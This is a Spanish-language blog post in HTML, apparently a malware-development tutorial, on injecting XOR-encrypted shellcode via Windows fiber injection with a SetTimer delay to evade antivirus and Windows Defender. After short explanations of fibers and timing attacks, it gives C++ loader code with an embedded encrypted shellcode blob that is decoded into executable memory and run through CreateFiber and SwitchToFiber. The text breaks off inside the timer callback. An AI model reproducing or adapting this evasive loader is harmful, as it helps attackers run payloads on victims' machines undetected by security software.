@@ -1,0 +1,1447 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="google-translate-customization" content="108d9124921d80c3-80e20d618ff053c8-g4f02ec6f3dba68b7-c">
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Inyeccion de shellcode via Fiber injection + Timming attack (SetTimer) | c4rta</title>
+<meta name="generator" content="Jekyll v4.3.2">
+<meta property="og:title" content="Inyeccion de shellcode via Fiber injection + Timming attack (SetTimer)">
+<meta name="author" content="c4rta">
+<meta property="og:locale" content="en_US">
+<meta name="description" content="Desarrollaremos un programa en C++ para inyectar una shellcode cifrada con XOR, ademas evadiremos los antivirus usando la tecnica Fiber Injection y un Timming Attack">
+<meta property="og:description" content="Desarrollaremos un programa en C++ para inyectar una shellcode cifrada con XOR, ademas evadiremos los antivirus usando la tecnica Fiber Injection y un Timming Attack">
+<link rel="canonical" href="https://ic4rta.github.io//maldev/2023/06/16/maldev-bypassAV-fiberInjection.html">
+<meta property="og:url" content="https://ic4rta.github.io//maldev/2023/06/16/maldev-bypassAV-fiberInjection.html">
+<meta property="og:site_name" content="c4rta">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2023-06-16T00:00:00+00:00">
+<meta name="twitter:card" content="summary">
+<meta property="twitter:title" content="Inyeccion de shellcode via Fiber injection + Timming attack (SetTimer)">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"c4rta"},"dateModified":"2023-06-16T00:00:00+00:00","datePublished":"2023-06-16T00:00:00+00:00","description":"Desarrollaremos un programa en C++ para inyectar una shellcode cifrada con XOR, ademas evadiremos los antivirus usando la tecnica Fiber Injection y un Timming Attack","headline":"Inyeccion de shellcode via Fiber injection + Timming attack (SetTimer)","mainEntityOfPage":{"@type":"WebPage","@id":"https://ic4rta.github.io//maldev/2023/06/16/maldev-bypassAV-fiberInjection.html"},"url":"https://ic4rta.github.io//maldev/2023/06/16/maldev-bypassAV-fiberInjection.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="shortcut icon" href="/favicon.png">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-noto-sans@0.0.72/index.min.css">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <script src="/assets/js/main.js"></script>
+  <link rel="stylesheet" href="/assets/css/syntax.css">
+<link type="application/atom+xml" rel="alternate" href="https://ic4rta.github.io//feed.xml" title="c4rta">
+<script>
+  function initGoogleAnalytics() {
+    var doNotTrack = (window.doNotTrack === "1" || navigator.doNotTrack === "1" ||
+      navigator.doNotTrack === "yes" || navigator.msDoNotTrack === "1");
+    var enableDNT = "true" == "true";
+
+    if (!enableDNT || !doNotTrack) {
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+      ga('create', 'UA-212989441-1', 'auto');
+      ga('send', 'pageview');
+    }
+  }
+  window.addEventListener("load", initGoogleAnalytics);
+</script>
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+<!-- and it's easy to individually load additional languages -->
+<script charset="UTF-8" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/languages/go.min.js"></script>
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #fff -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #ff4e00 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] uppercase -->
+  
+
+<script>
+// Init highlight js
+document.addEventListener('DOMContentLoaded', function(event) {
+  var els = document.querySelectorAll('pre code')
+
+  function addLangData(block) {
+    var outer = block.parentElement.parentElement.parentElement;
+    var lang = block.getAttribute('data-lang');
+    for (var i = 0; i < outer.classList.length; i++) {
+      var cls = outer.classList[i];
+      if (cls.startsWith('language-')) {
+        lang = cls;
+        break;
+      }
+    }
+    if (!lang) {
+      cls = block.getAttribute('class');
+      lang = cls ? cls.replace('hljs ', '') : '';
+    }
+    if (lang.startsWith('language-')) {
+      lang = lang.substr(9);
+    }
+    block.setAttribute('class', 'hljs ' + lang);
+    block.parentNode.setAttribute('data-lang', lang);
+  }
+
+  function addBadge(block) {
+    var enabled = ('true' || 'true').toLowerCase();
+    if (enabled == 'true') {
+      var pre = block.parentElement;
+      pre.classList.add('badge');
+    }
+  }
+
+  function handle(block) {
+    addLangData(block);
+    addBadge(block)
+    hljs.highlightBlock(block);
+  }
+
+  for (var i = 0; i < els.length; i++) {
+    var el = els[i];
+    handle(el);
+  }
+});
+</script>
+
+<style>
+  /* code language badge */
+  pre.badge::before {
+    content: attr(data-lang);
+    color: #fff;
+    background-color: #ff4e00;
+    padding: 0 .5em;
+    border-radius: 0 2px;
+    text-transform: uppercase;
+    text-align: center;
+    min-width: 32px;
+    display: inline-block;
+    position: absolute;
+    right: 0;
+  }
+
+  /* fix wrong badge display for firefox browser */
+  code > table pre::before {
+    display: none;
+  }
+</style>
+
+</head>
+<body>
+
+
+
+
+  
+      <!-- [function][get_value] uppercase -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+<header class="site-header site-header-transparent" role="banner">
+
+  <div class="wrapper">    
+    <div class="site-header-inner">
+<span class="site-brand"><a class="site-brand-inner" rel="author" href="/">
+  <img class="site-favicon" title="c4rta" src="/favicon.png" onerror="this.style.display='none'">
+  c4rta
+</a>
+</span><nav class="site-nav">
+          <input type="checkbox" id="nav-trigger" class="nav-trigger">
+          <label for="nav-trigger">
+            <span class="menu-icon">
+              <svg viewbox="0 0 18 15" width="18px" height="15px">
+                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
+              </svg>
+            </span>
+          </label>      
+          <div class="trigger">
+<a class="page-link" href="/">Home</a><a class="page-link" href="/categories.html">Categorias</a><a class="page-link" href="/tags.html">Etiquetas</a><a class="page-link" href="/about.html">Sobre Mi</a><a class="page-link" href="https://github.com/ic4rta" target="_blank"><img src="https://img.shields.io/badge/github-%23121011.svg?style=for-the-badge&logo=github&logoColor=white" alt="GitHub"></a>
+            <a class="page-link" href="http://twitter.com/_c4rta_" target="_blank"><img src="https://img.shields.io/badge/Twitter%20-%230077B5.svg?&style=for-the-badge&logo=Twitter&logoColor=white%22" alt="Twitter"></a>
+
+
+
+
+  
+      <!-- [function][get_value] [] -->
+  
+
+</div>
+        </nav>
+</div>
+  </div>
+
+</header>
+
+<!-- 页面菜单栏 注释=固定/不注释=隐藏 -->
+
+<script>
+  function initHeader() {
+    var lastScrollY = getScrollPos().y;
+    var documentElement = document.documentElement;
+
+    function storeScrollData() {
+      var y = getScrollPos().y;documentElement.setAttribute("data-header-transparent", "");var scrollStatus = "";
+
+      if (y <= 0) {
+        scrollStatus = "top";
+      } else if ((window.innerHeight + y) >= document.body.offsetHeight) {
+        scrollStatus = "bottom";
+      } else {
+        var isScrollDown = (y - lastScrollY > 0) ? true : false;
+        scrollStatus = isScrollDown ? "down" : "up";
+      }
+
+      lastScrollY = y;
+      documentElement.setAttribute("data-scroll-status", scrollStatus);
+    }
+
+    window.addEventListener('scroll', function(e) {
+      storeScrollData();
+    });
+
+    storeScrollData();
+  }
+  document.addEventListener('DOMContentLoaded', initHeader);
+</script>
+
+<!-- 页面菜单栏 注释=固定/不注释=隐藏 -->
+
+
+
+
+
+  
+      <!-- [function][get_value] [] -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] post-header.html -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] post-header.html -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+<style>
+    html .page-banner {
+      background: #000;
+    }
+  </style>
+<style>html .page-banner {
+      height:  18.4vh;
+      min-height: 50vh;
+    }
+    html[data-scroll-status="top"] .page-banner {
+      height: 50vh;
+    }
+  </style>
+<style>
+    html .page-banner .page-banner-img > *:first-child {
+      opacity: 0.618;
+    }
+
+    html[data-theme="dark"] .page-banner .page-banner-img > *:first-child {
+      opacity: 0.443724;
+    }
+  </style>
+<style>
+    html .page-banner .page-banner-inner > *:first-child > *:nth-child(1) {
+      font-size: 2.25em; font-weight: bold; 
+    }
+  </style>
+<style>
+    html .page-banner .page-banner-inner > *:first-child > *:nth-child(2) {
+      color: gold
+    }
+  </style>
+<section class="page-banner">
+    <div class="page-banner-img">
+<div style="background-image: url(/assets/images/home/home-t.png)"></div>
+        <img class="img-placeholder" src="/assets/images/home/home-t.png">
+</div>
+    <div class="wrapper">
+      <div class="page-banner-inner">
+<header class="post-header">
+  <h1 class="post-title p-name" itemprop="name headline">Inyeccion de shellcode via Fiber injection + Timming attack (SetTimer)</h1>
+  <h2 class="post-subtitle"></h2>
+
+  <p class="post-meta">
+    <time class="dt-published" datetime="2023-06-16T00:00:00+00:00" itemprop="datePublished"><i class="fa fa-calendar"></i> Jun 16, 2023
+    </time>
+
+    
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+      <!-- [function][get_article_words] 2407 -->
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 15 mins</span>
+  </p></header>
+</div>
+    </div>
+  </section><script>
+  function hashLocate(hashValue) {
+    hashValue = hashValue.replace(/^.*#h-/, '');
+    hashValue = decodeURIComponent(hashValue);
+    var element = document.getElementById(hashValue);
+
+    if (!element) {
+      return;
+    }
+
+    var header = document.querySelector('header.site-header');
+    var headerRect = header.getBoundingClientRect();
+    var headerTop = Math.floor(headerRect.top);
+    var headerHeight = Math.floor(headerRect.height);
+    var scrollPos = getScrollPos();
+    var offsetY = element.offsetTop - (headerTop + headerHeight + 20);
+
+    if (offsetY == scrollPos.y) {
+      return;
+    }
+
+    if (headerTop == 0  && offsetY > scrollPos.y) {
+      offsetY += headerHeight + 2;
+    } else if (headerTop < 0  && offsetY < scrollPos.y) {
+      offsetY -= headerHeight - 2;
+    }
+
+    smoothScrollTo(offsetY);
+  }
+
+  // The first event occurred
+  window.addEventListener('load', function(event) {
+    if (window.location.hash) {
+      hashLocate(window.location.hash);
+    }
+  });
+
+  // The first event occurred
+  window.addEventListener('click', function(event) {
+    if (event.target.tagName.toLowerCase() == 'a') {
+      hashLocate(event.target.getAttribute('href'));
+    }
+  });
+</script>
+<div class="theme-toggle">
+  <input type="checkbox" id="theme-switch">
+  <label for="theme-switch">
+    <div class="toggle"></div>
+    <div class="names">
+      <p class="light">Light</p>
+      <p class="dark">Dark</p>
+    </div>
+  </label>
+</div>
+
+
+
+
+  
+      <!-- [function][get_value] auto -->
+  
+
+<script>
+  (function() {
+    var sw = document.getElementById('theme-switch');
+    var html = document.getElementsByTagName('html')[0];
+    var nightModeOption = ('auto' || 'auto').toLowerCase();
+    var storage = nightModeOption === 'manual'
+        ? localStorage
+        : sessionStorage;
+    var themeData = loadThemeData();
+
+    function saveThemeData(data) {
+      storage.setItem('theme', JSON.stringify(data));
+    }
+
+    function loadThemeData() {
+      var data = storage.getItem('theme');
+      try {
+        data = JSON.parse(data ? data : '');
+      } catch(e) {
+        data = { nightShift: undefined, autoToggleAt: 0 };
+        saveThemeData(data);
+      }
+      return data;
+    }
+
+    function handleThemeToggle(nightShift) {
+      themeData.nightShift = nightShift;
+      saveThemeData(themeData);
+      html.dataset.theme = nightShift ? 'dark' : 'light';
+      setTimeout(function() {
+        sw.checked = nightShift ? true : false;
+      }, 50);
+    }
+
+    function autoThemeToggle() {
+      // Next time point of theme toggle
+      var now = new Date();
+      var toggleAt = new Date();
+      var hours = now.getHours();
+      var nightShift = hours >= 19 || hours <=7;
+
+      if (nightShift) {
+        if (hours > 7) {
+          toggleAt.setDate(toggleAt.getDate() + 1);
+        }
+        toggleAt.setHours(7);
+      } else {
+        toggleAt.setHours(19);
+      }
+
+      toggleAt.setMinutes(0);
+      toggleAt.setSeconds(0);
+      toggleAt.setMilliseconds(0)
+
+      var delay = toggleAt.getTime() - now.getTime();
+
+      // auto toggle theme mode
+      setTimeout(function() {
+        handleThemeToggle(!nightShift);
+      }, delay);
+
+      return {
+        nightShift: nightShift,
+        toggleAt: toggleAt.getTime()
+      };
+    }
+
+    // Listen the theme toggle event
+    sw.addEventListener('change', function(event) {
+      handleThemeToggle(event.target.checked);
+    });
+
+    if (nightModeOption == 'auto') {
+      var data = autoThemeToggle();
+
+      // Toggle theme by local setting
+      if (data.toggleAt > themeData.autoToggleAt) {
+        themeData.autoToggleAt = data.toggleAt;
+        handleThemeToggle(data.nightShift);
+      } else {
+        handleThemeToggle(themeData.nightShift);
+      }
+    } else if (nightModeOption == 'manual') {
+      handleThemeToggle(themeData.nightShift);
+    } else {
+      var nightShift = themeData.nightShift;
+      if (nightShift === undefined) {
+        nightShift = nightModeOption === 'on';
+      }
+      handleThemeToggle(nightShift);
+    }
+  })();
+</script>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="framework">
+  <section class="main">
+
+     <div class="post">
+  <section>
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] [] -->
+  
+
+<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+    <div class="post-content e-content" itemprop="articleBody">
+
+      <p class="lead">Desarrollaremos un programa en C++ para inyectar una shellcode cifrada con XOR, ademas evadiremos los antivirus usando la tecnica Fiber Injection y un Timming Attack</p>
+
+<p>Que ondaa, esta vez te voy a enseñar como pude evadir la deteccion de algunos antivirus de antiscan.me, y como evadir el windows defender, para esto use 3 cosas</p>
+
+<ul>
+  <li>Una shellcode cifrada con XOR</li>
+  <li>La tecnica <code class="language-plaintext highlighter-rouge">fiber injection</code>
+</li>
+  <li>Timming attack usando <code class="language-plaintext highlighter-rouge">SetTimer</code>
+</li>
+</ul>
+
+<h2 id="fibers-fibras">Fibers (Fibras)</h2>
+
+<p>Como sabras, cuando se ejecuta una aplicacion, el sistema operativo le asigna un proceso dentro de la memoria, por ejemplo, los procesos que ves al abrir al administrador de tereas, pues bien, esos procesos pueden tener otros subprocesos para ejecutar tareas en paralelo, a esto se le conoce como hilos, y es algo clave en la programacion concurrente, sin embargo, dentro de un hilo se puede estar ejecutando otra tarea, y para esto se usan las fibras.</p>
+
+<p>La definicion que nos da la WinAPI, es: <strong>“Una fibra es una unidad de ejecución que la aplicación debe programar manualmente”</strong>, pero la neta no se le entiende casi nada, asi que pongamos algo mas simple, una fibra tambien es conocida como un <code class="language-plaintext highlighter-rouge">hilo liviano</code>, es decir, una unidad de ejeucion que desprende de un hilo, osea que las fibras se ejecutan en el contexto del hilo que las creo, una caracteristica, es que un hilo puede tener varias fibras pero solo una puede ejecutarse una sola a la vez, y nosotros dedicimos cual, amenos que usemos SwitchToFiber para intercalar la ejecución</p>
+
+<h2 id="timming-attack-o-ataques-basados-en-temporizadores">Timming attack o ataques basados en temporizadores</h2>
+
+<p>En el contexto del desarrollo de malware, un timming attack se refiere a suspender o dormir la actividad del malware por un cierto periodo de tiempo, por ejemplo, podemos agregar un delay cuando se ejecute por primera vez, o podemos decirle al malware que ejecute sus acciones en una fecha, hora, dia, y momento especifico, es decir, cada cierto tiempo, para estas implementaciones se usan funciones de temporizado, de ahi su nombre.</p>
+
+<p><strong>Ojo</strong>: esto solo seria en el contexto del malware, tambien hay otro contexto de los timming attack que son los <code class="language-plaintext highlighter-rouge">side channel timing attack</code> o en español, <code class="language-plaintext highlighter-rouge">ataques de canal lateral basados en temporizadores</code>, pero eso es otro tema que no importa en este momento.</p>
+
+<h3 id="fiber-injection">Fiber injection</h3>
+
+<p>Es muy simple, la inyeccion de fibras se refiere a inyectar una fibra en el flujo de ejecucion del proceso, para implementar una inyeccion clasica de este tipo, se usan las funciones.</p>
+
+<ul>
+  <li>
+<strong>ConvertThreadToFiber()</strong>: Para convertir el hilo principal en una fibra</li>
+  <li>
+<strong>VirtualAlloc()</strong>: Para asignar memoria para la fibra</li>
+  <li>
+<strong>CreateFiber()</strong>: Para crear una nueva fibra que contendra la shellcode</li>
+  <li>
+<strong>SwitchToFiber()</strong>: Para ejecutar la fibra que tiene la shellcode</li>
+</ul>
+
+<p>Llamando a las funciones en ese orden podriamos hacer una fiber injection clasica, pero al fin de cuenta esto es programacion, y cada quien la puede implementar como le sale de su cabecita, o dependiendo del contexto donde se vaya a ejecutar, ahora te voy a explicar como la implemente, primero de pondre todo el codigo y te explicare que es lo que hace</p>
+
+<h4 id="codigo-completo">Codigo completo</h4>
+<p>Fue escrito y compilado desde Dev C++</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;winuser.h&gt;</span><span class="cp">
+</span>
+<span class="kt">void</span> <span class="nf">fiber_injection</span><span class="p">(){</span>
+	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+	    <span class="s">"</span><span class="se">\x86\x32\xf9\x9e\x8a\x92\xba\x7a\x7a\x7a\x3b\x2b\x3b\x2a</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x28\x2b\x2c\x32\x4b\xa8\x1f\x32\xf1\x28\x1a\x32\xf1\x28</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x62\x32\xf1\x28\x5a\x32\xf1\x08\x2a\x32\x75\xcd\x30\x30</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x37\x4b\xb3\x32\x4b\xba\xd6\x46\x1b\x06\x78\x56\x5a\x3b</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\xbb\xb3\x77\x3b\x7b\xbb\x98\x97\x28\x3b\x2b\x32\xf1\x28</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x5a\xf1\x38\x46\x32\x7b\xaa\xf1\xfa\xf2\x7a\x7a\x7a\x32</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\xff\xba\x0e\x1d\x32\x7b\xaa\x2a\xf1\x32\x62\x3e\xf1\x3a</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x5a\x33\x7b\xaa\x99\x2c\x32\x85\xb3\x3b\xf1\x4e\xf2\x32</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x7b\xac\x37\x4b\xb3\x32\x4b\xba\xd6\x3b\xbb\xb3\x77\x3b</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x7b\xbb\x42\x9a\x0f\x8b\x36\x79\x36\x5e\x72\x3f\x43\xab</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x0f\xa2\x22\x3e\xf1\x3a\x5e\x33\x7b\xaa\x1c\x3b\xf1\x76</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x32\x3e\xf1\x3a\x66\x33\x7b\xaa\x3b\xf1\x7e\xf2\x32\x7b</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\xaa\x3b\x22\x3b\x22\x24\x23\x20\x3b\x22\x3b\x23\x3b\x20</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x32\xf9\x96\x5a\x3b\x28\x85\x9a\x22\x3b\x23\x20\x32\xf1</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x68\x93\x2d\x85\x85\x85\x27\x32\xc0\x7b\x7a\x7a\x7a\x7a</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x7a\x7a\x7a\x32\xf7\xf7\x7b\x7b\x7a\x7a\x3b\xc0\x4b\xf1</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x15\xfd\x85\xaf\xc1\x8a\xcf\xd8\x2c\x3b\xc0\xdc\xef\xc7</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\xe7\x85\xaf\x32\xf9\xbe\x52\x46\x7c\x06\x70\xfa\x81\x9a</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x0f\x7f\xc1\x3d\x69\x08\x15\x10\x7a\x23\x3b\xf3\xa0\x85</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\xaf\x19\x1b\x16\x19\x54\x1f\x02\x1f\x7a</span><span class="s">"</span>
+	<span class="p">};</span>
+
+	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+		<span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span><span class="p">)(</span><span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">byte</span><span class="p">)</span><span class="sc">'z'</span><span class="p">);</span>
+	<span class="p">}</span>
+
+  	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">shellcode_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>
+
+	<span class="n">LPVOID</span> <span class="n">exec_mem</span><span class="p">;</span>
+	<span class="n">LPVOID</span> <span class="n">shellcode_fiber</span><span class="p">;</span> 
+
+	<span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span>
+	    <span class="nb">NULL</span><span class="p">,</span>
+	    <span class="n">shellcode_len</span><span class="p">,</span>
+	    <span class="n">MEM_COMMIT</span><span class="p">,</span>
+	    <span class="n">PAGE_EXECUTE_READWRITE</span>
+	<span class="p">);</span>
+
+	<span class="n">memcpy</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_len</span><span class="p">);</span>
+	<span class="n">shellcode_fiber</span> <span class="o">=</span> <span class="n">CreateFiber</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPFIBER_START_ROUTINE</span><span class="p">)</span><span class="n">exec_mem</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+  	<span class="n">SwitchToFiber</span><span class="p">(</span><span class="n">shellcode_fiber</span><span class="p">);</span>
+
+  	<span class="n">DeleteFiber</span><span class="p">(</span><span class="n">shellcode_fiber</span><span class="p">);</span>
+  	<span class="n">VirtualFree</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">MEM_RELEASE</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">VOID</span> <span class="n">CALLBACK</span> <span class="nf">shellcode_routine</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">param</span><span class="p">){</span>
+	<span class="n">UINT_PTR</span> <span class="n">timerId</span> <span class="o">=</span> <span class="n">SetTimer</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">20000</span><span class="p">,</span> <span class="p">[](</span><span class="n">HWND</span> <span class="n">hwnd</span><span class="p">,</span> <span class="n">UINT</span> <span class="n">uMsg</span><span class="p">,</span> <span class="n">UINT_PTR</span> <span class="n">idEvent</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwTime</span><span class="p">)</span> <span class="p">{</span>
+    	<span class="n">fiber_injection</span><span class="p">();</span>
